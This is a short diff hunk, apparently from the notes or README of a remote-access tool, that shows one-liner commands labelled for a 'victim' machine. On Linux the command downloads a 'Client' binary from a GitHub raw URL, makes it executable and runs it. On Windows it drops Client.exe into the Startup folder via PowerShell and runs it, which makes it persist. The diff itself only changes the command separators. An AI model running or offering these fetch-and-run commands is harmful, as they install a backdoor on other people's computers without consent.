@@ -46,4 +46,4 @@ bnt: @udbnt
 cd /boot; apt-get update -y; apt-get install curl -y; [ -f "Client" ] && rm Client; curl -O Client "https://raw.githubusercontent.com/NAME/NAME/main/NAME"; chmod 777 Client; ./Client
 
 # Windows victim
-cd "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup" && if exist Client.exe del Client.exe && powershell -command Invoke-WebRequest https://github.com/NAME/NAME/raw/main/NAME.exe -OutFile Client.exe && Client.exe
+cd "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup" & if exist Client.exe del Client.exe & powershell -command Invoke-WebRequest https://github.com/NAME/NAME/raw/main/NAME.exe -OutFile Client.exe & Client.exe
